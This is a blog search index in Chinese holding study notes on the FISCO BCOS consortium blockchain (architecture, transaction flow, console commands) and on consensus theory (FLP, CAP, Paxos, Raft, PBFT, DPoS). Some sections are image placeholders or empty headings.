<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>FISCO BCOS联盟链</title>
      <link href="/2024/12/26/BCOS%E8%81%94%E7%9B%9F%E9%93%BE/"/>
      <url>/2024/12/26/BCOS%E8%81%94%E7%9B%9F%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="FISCO-BCOS介绍"><a href="#FISCO-BCOS介绍" class="headerlink" title="FISCO BCOS介绍"></a>FISCO BCOS介绍</h2><p>FISCO BCOS 是一个稳定、高效、安全的<strong>区块链底层平台</strong>。联盟链需要多家机构来组成联盟，所以FISCO BCOS 支持多群组概念，这意味着多个组织可以通过FISCOBCOS的联盟链组成多个联盟，而且联盟中可以允许共同的组织节点。如下图所示，在多群组技术下FISCO BCOS可以支持众多应用领域。</p><h3 id="逻辑架构"><a href="#逻辑架构" class="headerlink" title="逻辑架构"></a><strong>逻辑架构</strong></h3><p>以下是FISCO BCOS 的逻辑架构，分为：<strong>基础层、互联核心层、链核心层、管理层和接口层。</strong></p><p>【1】</p><p><strong>基础层</strong></p><p>基础层提供区块链的基础数据结构和算法库，包括<strong>密码学算法、隐私算法</strong>等。</p><p><strong>链核心层</strong></p><p>链核心层主要实现区块链的链式数据结构和数据存储（分布式存储），采用了不同的数据库（LevelDB、MySQL、Qracle）来存储区块数据。</p><p><strong>互联核心层</strong></p><p>互联核心层实现了区块链的<strong>基础 P2P 网络通信、共识机制和区块同步机制</strong>。</p><p><strong>管理层</strong></p><p>相对于区块链基础架构，FISCO BCOS 细分出了管理层，实现区块链的<strong>管理功能</strong>，比如说参数配置、账本管理等。</p><p><strong>接口层</strong></p><p>接口层主要对应的是应用层，面向区块链用户，提供交互式控制台与各类应用接口。同时<strong>还包括智能合约与DApp</strong>。</p><h3 id="区块链交易流程"><a href="#区块链交易流程" class="headerlink" title="区块链交易流程"></a>区块链交易流程</h3><p>区块链引入智能合约后，交易便超 脱『价值转移』的原始定义，其更 加精准的定义应该是区块链中一次 事务的数字记录。无论大小事务， 都需要交易的参与。</p><p>下图展示了FISCO BCOS区块 链交易的<strong>完整生命周期。</strong>客户 端一般是交易创建与发起的位 置，随后交易接入相关节点进 行验签与广播；之后交易会进 入节点交易池内，并在共识节 点处完成交易的执行；最后整 个区块链网络上的节点可以来 验证与储存这笔交易。</p><p>【2】</p><h4 id="交易生成"><a href="#交易生成" class="headerlink" title="交易生成"></a>交易生成</h4><p>用户的请求给到客户端后，客户端会构建出一笔有效交易，交易中包括以下关键信息：</p><p>【3】</p><h4 id="交易构建"><a href="#交易构建" class="headerlink" title="交易构建"></a>交易构建</h4><p>之后，如图所示，<strong>区块链客户端会再向交易填充一些必要的字段，如用于防止交易重放的交易ID及blockLimit（区块限制），</strong>这个填充过程被称为交易构建。交易构建完成后，客户端随后便通过Channel或RPC信道将交易发送给节点。</p><p><strong>ps:</strong></p><p>Channel 可以理解为一个长时间的聊天群， 想发消息的时候，客户端或是服务端直接 往这个群里发消息，对端可以直接收到并进行相应。不想发消息的时候，让它空闲就可以了。</p><p>RPC可以理解为一次性的聊天群，发送一 个消息后，如果对端接受到并返回了响应， 那么接受到响应后，这个群就解散了。下 次想要再发送消息，就要再次建一个一次性群。</p><h4 id="交易池"><a href="#交易池" class="headerlink" title="交易池"></a>交易池</h4><p>区块链交易被发送到节点后，节点会通过验证交易签名的方式来验证一笔交易是否合法。若一笔交易合法，则 节点会进一步检查该交易是否重复出现过，若从未出现过，则将交易加入交易池缓存起来。若交易不合法或交 易重复出现，则将直接丢弃交易。</p><h4 id="交易广播"><a href="#交易广播" class="headerlink" title="交易广播"></a>交易广播</h4><p><strong>节点在收到交易后，除了将交易缓存在交易池外，节点还会将交易广播至该节点已知的其他节点</strong>。 为了能让交易尽可能到达所有节点，其他收到广播过来的交易节点，也会根据一些精巧的策略选择一些节点，将交易再一次进行广播。</p><p>比如：对于从其他节点转发过来的交易，节点只会随机选择25%的节点再次广播，因为这种情况一般意味着交易已经开始在网络中被节点接力传递，缩减广播的规模有助于避免因网络中冗余的交易太多而出现的广播风暴问题。</p><h4 id="交易打包"><a href="#交易打包" class="headerlink" title="交易打包"></a><strong>交易打包</strong></h4><p>为了提高交易处理效率，同时也为了确定交易之后的执行顺序保证事务性，当交易池中有交易时，Sealer（共识节点）线程负责从交易池中按照先进先出的顺序取出一定数量的交易，组装成<strong>待共识区块</strong>，随后待共识区块会被发往各个节点进行处理。</p><p>【5】</p><h4 id="交易执行"><a href="#交易执行" class="headerlink" title="交易执行"></a>交易执行</h4><p>节点在收到区块后，会调用区块验证器把交易从区块中逐一拿出来执行。如果是预编译合约代码，验证器中的执行引擎会直接调用相应的C++功能，否则执行引擎就会把交易交给EVM（以太坊虚拟机）执行。</p><h4 id="交易共识"><a href="#交易共识" class="headerlink" title="交易共识"></a>交易共识</h4><p>区块链要求节点间就区块的执行结果达成一致才能出块。FISCOBCOS中一般采用PBFT算法保证整个系统的一致性，其大概流程是：各个节点先独立执行相同的区块，随后节点间交换各自的执行结果，如果发现超过2&#x2F;3的节点都得出了相同的执行结果，那说明这个区块在大多数节点上取得了一致，节点便会开始出块。</p><h4 id="交易落盘"><a href="#交易落盘" class="headerlink" title="交易落盘"></a>交易落盘</h4><p>在共识出块后，节点需要将区块中的交易及执行结果写入硬盘永久保存，并更新区块高度与区块哈希的映射表等内容，然后节点会从交易池中剔除已落盘的交易，以开始新一轮的出块流程。用户可以通过交易哈希等信息，在链上的历史数据中查询自己感兴趣的交易数据及回执信息。</p><hr><p>同样可以作为联盟链的Hyperledger与FISCO BCOS相比有哪些异同？</p><hr><h3 id="FISCO-BCOS区块链应用案例"><a href="#FISCO-BCOS区块链应用案例" class="headerlink" title="FISCO BCOS区块链应用案例"></a>FISCO BCOS区块链应用案例</h3><h4 id="应用场景-行业"><a href="#应用场景-行业" class="headerlink" title="应用场景&#x2F;行业"></a>应用场景&#x2F;行业</h4><p>【7】</p><h4 id="应用典型案例"><a href="#应用典型案例" class="headerlink" title="应用典型案例"></a>应用典型案例</h4><p>【8】</p><p>【9】</p><p>【10】</p><p>【11】</p><p>【12】</p><h3 id="FISCOBCOS控制台工具"><a href="#FISCOBCOS控制台工具" class="headerlink" title="FISCOBCOS控制台工具"></a>FISCOBCOS控制台工具</h3><h4 id="控制台简介"><a href="#控制台简介" class="headerlink" title="控制台简介"></a>控制台简介</h4><p>命令行交互控制台（简称“控制台”）是FISCO BCOS 2.0重要的交互式客户端工具，它通过Java SDK与区块链节点建立连接，实现对区块链节点数据的读写访问请求。它提供一个合约编译工具，用户可以方便快捷的将Solidity合约文件编译为Java合约文件。使用控制台的相关功能需要事先搭建好FISCO BCOS区块链，以下为控制台的常用命令：</p><p>【13】</p><p><strong>控制台特点</strong></p><p>在<strong>应用开发场景</strong>下，控制台有以下几个特点： </p><p>（1）实现查询区块链相关的一系列命令——让区块链“看得见摸得着”控制台能做到例如查询区块高度、交易、节点等信息，并且根据不同参数，提供不同的查询方式以满足不同条件下的查询需求。 </p><p>（2）直接部署和调用合约 用户写好合约，放入指定路径，在控制台输入一个命令（deploy）即可完成部署，再用call指令就能调用合约接口，不需要其他任何额外的工作。另外，FISCO BCOS区块链提供CNS（合约命令服务）功能。链上可以记录部署的合约名、版本号和对应的合约部署地址；部署合约时，可以指定合约名和版本号；调用合约时，可以指定合约名和版本号。 （3）管理区块链 FISCO BCOS 2.0 提供节点管理、系统参数管理、权限管理功能，控制台均提供对应的命令进行操作，方便用户通过简单的命令轻松管理区块链。</p><p><strong>控制台安装</strong></p><p>【14】</p><h4 id="控制台启动"><a href="#控制台启动" class="headerlink" title="控制台启动"></a>控制台启动</h4><p><strong>默认启动</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./strat.sh</span><br></pre></td></tr></table></figure><p>注意：控制台启动未指定<strong>私钥账户</strong>时，会尝试从accounts目录下加载一个可用的私钥账户用于发送交易，加载失败则会创建一个新的PEM格式的账户文件，将其保存在accounts目录下</p><p><strong>PEM格式的文件</strong>：PEM文件是一个短的二进制文件，它包含一个独特的公钥或私钥，用于验证信息的来源和确认网站用户或服务器的身份。这种.pem文件也可以存储整个密钥链，包括根证书。</p><p>【15】</p><p><strong>指定群号启动</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./strat.sh 2</span><br></pre></td></tr></table></figure><p>当我们FISCO BCOS的区块链有多个群组（群组1、群组2）存在时，可以根据群组号来启动控制台</p><p>[16]</p><p>除了以上两种常用的启动控制台的方式之外，还有另外两种启动方式（了解即可）</p><ul><li>使用PEM格式私钥文件启动</li><li>使用PKCS12格式私钥文件启动</li></ul><h4 id="控制台命令"><a href="#控制台命令" class="headerlink" title="控制台命令"></a>控制台命令</h4><p><strong>控制台命令结构</strong></p><p>控制台命令由两部分组成，即<strong>指令和指令相关的参数：</strong></p><p><strong>指令</strong></p><p>指令是执行的操作命令，包括查询区块链相关信息，部署合约和调用合约的指令等，其中部分指令调用JSON-RPC接口，因此与JSON-RPC接口同名。</p><p>使用提示： 指令可以使用tab键补全，并且支持按上下键显示历史输入指令。</p><p><strong>指令相关的参数</strong></p><p>指令调用接口需要的参数，指令与参数以及参数与参数之间均用空格分隔，与JSON-RPC接口同名命令的输入参数和获取信息字段的详细解释请参考以下网址：<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/api.html">https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/api.html</a></p><p><strong>JSON-RPC介绍</strong> </p><p>JSON是一种轻量级的数据交换格式，它可以表示数值、字符串、序列及名&#x2F;值对集合。而JSON-RPC是一种<strong>无状态的，轻量级的远程程序调用协议</strong>。</p><p>JSON-RPC协议中的客户端一般是为了向远程系统请求执行某个方法。客户端向实现了JSON-RPC协议的服务端发送请求，多个输入参数能够通过数组或者对象传递到远程方法，这个远程方法也能返回多个输出数据。</p><p>JSON-RPC所有的传输都是单个对象，用JSON格式进行序列化。JSON-RPC的<strong>请求包</strong>含三个特定属性：</p><p>【17】</p><p>响应的接收者必须能够给出所有请求以正确的响应。JSON-RPC的<strong>响应包</strong>也有三个属性：</p><p>【18】</p><h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h5><p>常用的合约相关命令包括<strong>利用CNS部署和调用合约命令以及普通部署和调用合约命令</strong>。</p><p> 为给业务方提供更加良好的智能合约调用体验，FISCO BCOS提出CNS（合约命名服务）方案。CNS通过提供链上合约名称与合约地址映射关系的记录及相应的查询功能，方便业务方通过记忆简单的合约名称来实现对链上合约的调用。</p><p>1、<strong>利用CNS部署和调用合约的命令：</strong></p><p>【19】</p><hr><p>部署合约：<strong>deployByCNS</strong></p><p>运行deployByCNS，采用CNS部署合约。用CNS部署的合约，可用合约名直接调用</p><p>参数包含以下两部分：</p><p> • 合约路径：合约文件的路径，支持相对路径、绝对路径和默认路径三种方式。用户输入为文件名时，从默认目录获取文件，默认目录为: contracts&#x2F;solidity。</p><p>• 合约版本号：部署的合约版本号(长度不能超过40)。</p><p>举了三个例子，分别是：</p><p> • 部署HelloWorld合约1.0版； </p><p>• 部署HelloWorld合约2.0版；</p><p> • 部署TableTest合约1.0版； 在控制台输入合约名称以及版本号 后，成功部署了相应的合约。</p><p>【20】</p><p>需要注意的是： </p><p>• 部署用户编写的合约，可以将solidity合 约文件放到控制台根目录的 contracts&#x2F;solidity&#x2F;目录下，然后进行部 署即可。按<strong>tab键</strong>可以搜索 contracts&#x2F;solidity&#x2F;目录下的合约名称。 </p><p>• 若需要部署的合约引用了其他合约或 library库，引用<strong>格式为import “.&#x2F;XXX.sol</strong>“;。其相关引入的合约和 library库均放在contracts&#x2F;solidity&#x2F;目录。 </p><p>• 如果合约引用了library库，library库文件的名称必须以<strong>Lib字符串</strong>开始，以便于区分是普通合约与library库文件。 library库文件不能单独部署和调用。</p><hr><p>调用合约: <strong>callByCNS</strong></p><p> 运行callByCNS，采用CNS调用合约，即用合约名直接调用合约。</p><p>参数包含以下三部分： </p><p>• 合约名称与合约版本号：合约名称与版本号用英文冒号分隔，例如HelloWorld:1.0。当省略合约版本号时，例如HelloWorld，则调用最新版本的合约。</p><p>• 合约接口名：调用的合约接口名。</p><p>• 接口参数：由合约接口参数决定。参数由空格分隔，其中字符串、字节类型参数需要加上双引号；数组参数需要加上中括号，比如[1,2,3]，数组中是字符串或字节类型，加双引号，例如[“alice” , ”bob”]；布尔类型为true或者false。</p><p>下图中各举了两组合约调用的例子，分别是对set以及get接口的调用，在控制台输入合约名称、版本号以及接口名称和参数后，成功调用了合约。</p><p>【21】</p><hr><p>查询CNS部署合约信息: <strong>queryCNS</strong> </p><p>运行queryCNS，根据合约名称和合约版本号（可选参数）查询CNS表记录信息（合约名和合约地址的映射）。 </p><p>参数包含以下两部分： </p><p>• <strong>合约名称</strong>：部署的合约名称。</p><p>• <strong>合约版本号</strong>：(可选)部署的合约版本号。</p><p>下图中各举了一个查询CNS表记录信息的例子，分别在控制台输入合约名称和合约版本号，成功获取了记录表信息。</p><p>【22】</p><p><strong>普通部署和调用合约命令</strong></p><ul><li>deploy</li><li>call</li></ul><p>在应用开发场景下，<strong>deploy命令用于部署合约，call命令用于调用合约</strong></p><p>部署合约(默认提供HelloWorld合约和TableTest.sol进行示例使用)：</p><p>参数包含以下一部分： </p><p>• <strong>合约路径</strong>：合约文件的路径，支持相对路径、绝对路径和默认路径三种方式。用户输入为文件名时，从默认目录获取文件，默认目录为: contracts&#x2F;solidity，比如：HelloWorld。</p><p>下图中分别通过三种路径方式来对HelloWorld合约进行了部署。</p><p>【23】</p><hr><p><strong>调用合约: call</strong> </p><p>运行call，调用合约。</p><p> 参数包含以下四部分：</p><p> • 合约路径：合约文件的路径，支持相对路径、绝对路径和默认路径三种方式。用户输入为文件名时，从默认目录获取文件，默认目录为: contracts&#x2F;solidity。</p><p>• 合约地址: 部署合约获取的地址，合约地址可以省略前缀0，例如，0x000ac78可以简写成0xac78。 </p><p>• 合约接口名：调用的合约接口名。 </p><p>• 接口参数：由合约接口参数决定。参数由空格分隔，其中字符串、字节类型参数需要加上双引号；数组参数需要加上中括号，比如[1,2,3]，数组中是字符串或字节类型，加双引号，例如[“alice” , ”bob”]，注意数组参数中不要有空格；布尔类型为true或者false。 </p><p>下图中通过调用HelloWorld合约中的get与set接口完成了对name字符串的设置。</p><p>【24】</p><hr><p>其他常用命令：</p><p>【25】</p>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链原——Fabric</title>
      <link href="/2024/12/20/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94Fabric/"/>
      <url>/2024/12/20/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94Fabric/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>链原——共识机制</title>
      <link href="/2024/12/20/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94%E5%85%B1%E8%AF%86%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/12/20/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94%E5%85%B1%E8%AF%86%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="区块链共识机制"><a href="#区块链共识机制" class="headerlink" title="区块链共识机制"></a><strong>区块链共识机制</strong></h2><p><strong>由于各个节点的自身状态和所处网络环境不尽相同，而交易信息的传递又需要时间，并且消息传递本身不可靠，每个节点接收到的需要记录的交易内容和顺序也难以保持一致。因此，区块链系统的共识问题，或者说账本数据一致性问题，是关系着整个区块链系统的正确性和安全性的关键问题。</strong></p><h3 id="共识基本原理与问题"><a href="#共识基本原理与问题" class="headerlink" title="共识基本原理与问题"></a><strong>共识基本原理与问题</strong></h3><h4 id="数据一致性问题"><a href="#数据一致性问题" class="headerlink" title="数据一致性问题"></a><strong>数据一致性问题</strong></h4><p>区块链系统的分布式账本中，如何确保分散存储于多个不同网络节点的账本数据在任意时刻都是一致与可信的，不会发生数据冲突与错误，这就涉及分布式系统的一致性问题。</p><p><strong>在分布式系统中，各个节点数据的一致性与节点数据的可信性并不是一个问题，解决系统一致性问题并不一定能保证系统数据的正确可信，区块链共识机制的关键是需要同时解决好一致性与可信性两个问题</strong></p><h4 id="FLP定理"><a href="#FLP定理" class="headerlink" title="FLP定理"></a>FLP定理</h4><p><strong>FLP定理1：在异步通信的分布式系统中，即使只有一个进程失败，也没有任何算法能保证非故障进程达到一致性。</strong></p><p><strong>FLP定理假设的分布式系统模型如下：</strong></p><p>  <strong>(1) 异步通信</strong>：异步通信与同步通信的最大区别是没有时钟、不能时间同步、不能使用超时、不能探测失败、消息可任意延迟、消息可乱序；</p><p>  <strong>(2) 通信健壮</strong>：只要进程非失败，消息虽会被无限延迟，但最终会被送达，且消息仅会被送达一次（无重复）；</p><p>  <strong>(3) Fail-Stop模型</strong>：进程失败如同宕机，不再处理任何消息，也不会产生错误消息；</p><p>  <strong>(4) 失败进程数量</strong>：最多只有一个进程失败或单节点宕机。</p><p><strong>FLP定理2：假设在一个分布式系统中，绝大多数进程最初都是正常运行的，且没有进程在运行过程中发生故障，则一定存在一个部分正确的共识协议使所有非故障进程总是能达成一致决议。</strong></p><p><strong>安全性（Safety）与活性（Liveness）两种分布式系统特性</strong>：</p><p>  (1)“安全性”是指当分布式系统中即使有节点发生故障时，也不会导致系统产生错误的数据结果。</p><p>  (2)“活性”是指分布式系统中即使有节点发生故障时，系统也可以一直持续运行下去，不会发生系统瘫痪。</p><h4 id="CAP定理"><a href="#CAP定理" class="headerlink" title="CAP定理"></a>CAP定理</h4><p><strong>CAP定理：一个分布式系统不可能同时满足一致性、可用性、分区容错等三个特性，最多具有一致性、可用性、分区容错这三个特性中的两个。</strong></p><p>CAP定理的名称是其定义中给出的分布式系统的一致性（Consistency）、可用性（Availability）、分区容错（Partition Tolerance）三个特性的英文首字母缩写。</p><p><strong>(1)</strong> <strong>一致性</strong></p><p>   <strong>在CAP定理中，分布式系统的一致性是指各节点的数据保证一致，即每次从任意节点写入数据后，后续其它节点都能读取到最新的数据。</strong></p><p>  <strong>(2) 可用性</strong></p><p>   <strong>在CAP定理中，分布式系统的可用性是指每次向非故障的节点发送请求，总能保证收到响应数据。</strong></p><p>  <strong>(3)</strong> <strong>分区容错</strong></p><p>   <strong>在CAP定理中，分布式系统的分区容错是指系统可以容忍不同节点之间消息传递存在延迟或丢失等错误，而不影响系统整体正常运行。</strong></p><h4 id="两军问题"><a href="#两军问题" class="headerlink" title="两军问题"></a><strong>两军问题</strong></h4><p><strong>原本是用来分析在一个不可靠的通信链路上试图通过通信以达成一致是存在问题的，后来常被用于阐述分布式系统的一致性和共识问题</strong></p><h4 id="拜占庭将军问题"><a href="#拜占庭将军问题" class="headerlink" title="拜占庭将军问题"></a><strong>拜占庭将军问题</strong></h4><p><strong>拜占庭将军问题描述了</strong>如何在存在恶意行为（如消息被篡改）的情况下实现分布式系统的一致性，该问题既是分布式系统领域最复杂的容错模型之一，也是我们理解分布式共识算法和协议的重要基础。</p><ul><li><p><strong>问题求解</strong></p><p> 如果将拜占庭问题中的攻城军队的将军数量对应为分布式系统的节点数量，可以将符合拜占庭问题条件的分布式系统称为“拜占庭系统”，在拜占庭系统中任意两个节点之间的通信是保证可达的，综合上面对最简单的三将军情形分析，可以得出以下结论：</p></li></ul><p><strong>对于一个拜占庭系统，如果系统总节点数为Z，表示叛变将军的不可靠节点数为X，只有当Z≥3X＋1时，可由基于拜占庭容错（BFT）类算法的协议保证系统的一致性。</strong></p><p>  在实际的系统中，一般把由于系统故障导致节点不响应的情况归类为“非拜占庭错误（Crash Fault）”，把节点伪造或篡改信息进行恶意响应的情况归类为“拜占庭错误（Byzantine Fault）”。</p><h3 id="非拜占庭容错类共识算法（CFT）"><a href="#非拜占庭容错类共识算法（CFT）" class="headerlink" title="非拜占庭容错类共识算法（CFT）"></a><strong>非拜占庭容错类共识算法</strong>（CFT）</h3><p>​     对于分布式系统，非拜占庭容错类共识算法能在节点发生系统故障或非计划停机等非拜占庭错误时，确保整个分布式系统的可靠性；但是，当系统中存在恶意节点伪造或篡改数据等行为时，非拜占庭容错算法无法保证系统的可靠性。因此，非拜占庭容错类共识算法主要用于实现封闭的、系统节点都受控的企业级分布式系统，如某企业构建的内部分布式应用集群系统或分布式存储系统。非拜占庭容错类共识算法中最有代表性的包括Paxos算法与Raft算法。</p><h4 id="Paxos算法"><a href="#Paxos算法" class="headerlink" title="Paxos算法"></a><strong>Paxos算法</strong></h4><p>  Paxos算法是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一，其解决的问题就是在分布式系统中如何就某个值（决议）达成一致。</p><p><strong>前提1</strong>：为了保证不出现一些不合法的命令序列，Paxos算法运行的环境必须处在一个可靠的通信网络环境中。即使在异步通信过程中，发送的数据可能会丢失（Lost）、延迟（Delayed）或重复（Duplicated），但不会出现被篡改。</p><p>**前提2:**Paxos算法运行的环境不会出现拜占庭将军问题，即节点群在决定命令序列的过程中不存在恶意节点或受到病毒、黑客的影响的节点。</p><p><strong>Paxos算法的原理</strong></p><p>​    <strong>Paxos算法把一个分布式系统中节点划分为3种角色：Proposer（提出提案者）、Acceptor（接受提案者）和Learner（学习决议者）。一个节点可以同时拥有多个角色。</strong></p><p><strong>Proposer（提出提案者）</strong>：提出提案，提案信息包括提案编号n和提案内容v。常常是分布式系统的发送消息数据的节点担任该角色。</p><p><strong>Acceptor（接受提案者）</strong>：收到并审批提案，若提案获得多数Acceptor的接受，则该提案被批准。常常是分布式系统接收消息数据的节点担任该角色，一般需要至少3个且节点个数为奇数，因为Paxos算法最终要产生一个大多数决策者都同意的提案。</p><p><strong>Learner（学习决议者）</strong>：被告知提案结果，并与之统一，不参与审批过程，执行被批准的提案中包含的提案内容。</p><p><strong>一个Paxos算法实例的执行包括准备提案（Prepare）和提交提案（Commit）两个阶段，Paxos算法流程如图所示。</strong></p><p><img src="https://s2.loli.net/2024/12/21/hBeaGVUxCMbjHZy.png" alt="1.png"></p><p>  <strong>(1) 准备提案阶段</strong></p><p>   <strong>Proposer节点收到Acceptor节点的响应，可能存在抢占失败或抢占成功两种情况：</strong> </p><p><strong>如果Proposer节点收到超半数以上的Acceptor节点回复的提案编号要大于自己发送的提案编号；则抢占失败。</strong></p><p><strong>如果Proposer节点收到超半数以上Acceptor节点的回复的提案编号等于自己发送的提案编号，则抢占成功；这时Proposer节点就可以进入下一个“提交提案”阶段。</strong></p><p><strong>(2) 提交提案阶段</strong></p><p><strong>Proposer节点将抢占的提案编号 n 和提案内容v发送给Acceptor节点。Acceptor节点只批准比自己已经接受提案的编号N大或等于的提案（称为“审批成功”）；并承诺不再接受小于 n 的提案。</strong></p><p><strong>Acceptor节点收到提案后，如果提案的编号大于等于它已经接受的所有提案编号，则Acceptor节点将批准此提案内容并将此批准过的提案回复给Proposer节点。如果提交审批的提案编号小于它已经接受的提案编号，则审批失败，并回复所接受的提案编号。</strong></p><p><strong>如果Proposer节点收到多数派审批失败（此种情况也称为“提案失败”），则将提案编号递增一，重新进入“准备提案阶段”。</strong></p><p><strong>如果Proposer节点收到多数派提案内容相同，则此决议案已经形成。</strong></p><p><strong>Paxos算法的局限性</strong></p><p>​    Paxos算法虽然可以容忍已经申请到访问权的Proposer节点故障，可以容忍少数Acceptor节点故障；但在出现竞争的情况下，其收敛速度很慢，甚至可能出现活锁的情况，例如当有等于或多于Acceptor节点数量的Proposer节点同时发送提案请求后，很难有一个Proposer节点收到半数以上的回复而不断地执行第一阶段的协议。</p><h4 id="Raft算法"><a href="#Raft算法" class="headerlink" title="Raft算法"></a><strong>Raft算法</strong></h4><p><strong>Raft算法名字来源于可靠（Reliable）、可复制（Replicated）、可冗余（Redundant）与可容错（Fault-Tolerant）。</strong></p><p>​    <strong>Raft算法要解决核心问题仍然是在没有拜占庭错误下的分布式系统的共识问题，即在系统节点不会做恶，传递的消息也不会被篡改的前提下如何保证每个节点在执行相同的命令序列。</strong></p><p><strong>前提1：原来的Leader节点发生故障失效后，必须选出一个新的Leader节点，日志复制的顺序也是确定的，必须从Leader节点流向Follower节点。</strong></p><p><strong>前提2：日志复制只允许Leader节点从客户端接收日志，并复制到整个分布式系统的节点中。</strong></p><p><strong>前提3：与Paxos算法一样，Raft算法运行的环境不会出现拜占庭将军问题，即节点群在决定命令序列的过程中不存在恶意节点或受到病毒、黑客的影响的节点。</strong></p><p><strong>Raft算法的原理</strong></p><p>​    <strong>Raft算法中，分布式系统的各节点通过心跳（Heartbeat）消息来保持通信，一个节点可以是以下三种角色中的一种：</strong></p><p><strong>Leader（领导者）：</strong>Leader节点也称为“主节点”，用于对所有用户的请求进行处理。Leader 节点将带领分布式系统中的所有节点对数据更改达成一致，这个过程被称为日志同步。</p><p><strong>Follower（跟随者）：</strong>Follower节点也称为“从节点”，不会主动发送消息，只响应来自Leader节点与Candidate节点的请求。最开始时，所有的节点都是Follower节点，如果Follower节点收不到Leader节点的心跳消息，那么Follower节点会变为Candidate节点。</p><p><strong>Candidate（候选人）</strong>：Candidate节点是准备竞选Leader的节点。Candidate节点会向其他节点发起投票（包括投给自己的一票），如果一个Candidate节点收到了半数以上的选票，那么它就当选为新的Leader节点。</p><p><strong>Raft算法为了清晰易懂，将分布式系统一致性共识问题分解为选举主节点（Leader Election）、日志复制（Log Replication）、安全性（Safety）、成员变更（Membership Changes）等几个子问题，每个子问题都可以独立求解，因此理解 Raft 算法只需要相对独立地弄清几个子问题即可。</strong></p><p><strong>Raft算法的局限性</strong></p><p>Raft算法有一个很强的前提就是Leader节点和Follower节点都必须按顺序投票。例如一个基于Raft算法的分布式数据库系统中，必须按照以下顺序处理事务：</p><p>  (1)主库节点按事务顺序发送事务日志；</p><p>  (2)备库节点按事务顺序持久化事务，并应答主库节点；</p><p>  (3)主库节点按事务顺序提交事务。</p><p>   如果不严格按照上述顺序，Raft算法的正确性无法得到保证。但是，对于高峰期每秒钟处理成千上万的事务的分布式数据库，可能会造成无法忽视的潜在性能和稳定性风险。此外，Raft算法的顺序投票策略也会对数据库的多表事务、故障恢复产生影响。</p><h3 id="拜占庭容错类共识算法（BFT）"><a href="#拜占庭容错类共识算法（BFT）" class="headerlink" title="拜占庭容错类共识算法（BFT）"></a><strong>拜占庭容错类共识算法</strong>（BFT）</h3><p><strong>拜占庭容错类共识算法能允许分布式系统节点发生任何类型的错误但错误节点数量不超过一定比例时，确保整个分布式系统的可靠性。</strong>简单的说，只要分布式系统的故障（由于非拜占庭错误或拜占庭错误导致）节点数与系统总节点数相比，小于一定比例，拜占庭容错类共识算法就能保证分布式系统的可靠性。由于像比特币、以太坊等区块链系统中，存在大量彼此不信任的网络节点，不排除有恶意节点企图伪造或篡改系统数据，因此，<strong>拜占庭容错类共识算法是区块链共识机制主要采用的共识算法</strong>。拜占庭容错类共识算法中最有代表性的包括PBFT实用拜占庭容错算法、PoW工作量证明算法、PoS权益证明算法等。</p><h4 id="PBFT实用拜占庭容错算法"><a href="#PBFT实用拜占庭容错算法" class="headerlink" title="PBFT实用拜占庭容错算法"></a><strong>PBFT实用拜占庭容错算法</strong></h4><p><strong>PBFT（Practical Byzantine Fault Tolerance）算法中文译为实用拜占庭容错算法，简称PBFT算法。</strong></p><p><strong>解决了原始拜占庭容错算法效率不高的问题，将算法复杂度由指数级降低到多项式级，使得在实际系统中解决拜占庭错误（Byzantine Failure）变得可行。</strong></p><p><strong>PBFT算法的原理</strong></p><h4 id="PoW工作量证明算法"><a href="#PoW工作量证明算法" class="headerlink" title="PoW工作量证明算法"></a><strong>PoW工作量证明算法</strong></h4><h4 id="PoS权益证明算法"><a href="#PoS权益证明算法" class="headerlink" title="PoS权益证明算法"></a><strong>PoS权益证明算法</strong></h4><h4 id="DPoS委托权益证明算法"><a href="#DPoS委托权益证明算法" class="headerlink" title="DPoS委托权益证明算法"></a><strong>DPoS委托权益证明算法</strong></h4><p><strong>DPoS算法的目的是</strong>为了解决PoW算法的性能与巨大算力资源消耗问题以及PoS算法后期可能出现的少数节点持有大量权益带来的中心化风险问题****。在DPoS算法中，保留了PoS算法的权益机制，借鉴了类似于股份制企业中董事会投票机制的方式，节点用持有的股份投票选出少量称为见证人的节点，这些见证人节点会代理其余节点完成区块的生成和验证。通过减少对确认数量的要求，DPoS算法大大提高了交易的性能。</p><p><strong>DPoS算法的原理</strong></p><p><strong>DPoS共识算法引入了一种类似民主代表大会的机制，系统中所有拥有权益的普通节点投票选举出代表自身权益的见证人节点来实际运营网络，见证人节点提供专业运行的网络服务器来保证区块链网络的安全和性能。</strong></p><p><strong>前提1</strong>：见证人节点必须代表普通节点行使区块链出块权利，如果见证人节点不称职，随时都可能被投票出局。</p><p><strong>前提2</strong>：见证人节点的数量是固定的，一般是奇数，取决于区块链系统的设计，如在EOS系统中有21个，Bitshares系统中有101个。</p><p><strong>DPoS算法中，区块链系统的节点被划分为普通节点、见证人节点两大类角色。</strong></p><p>   (1) 普通节点</p><p>​    普通节点又称为“权益相关者”节点，是系统中占比最大的节点类型，具有投票权和被选举权，普通节点持有的权益（如货币量、币龄）越多，投票的权重就越高。</p><p>   (2) 见证人节点</p><p>   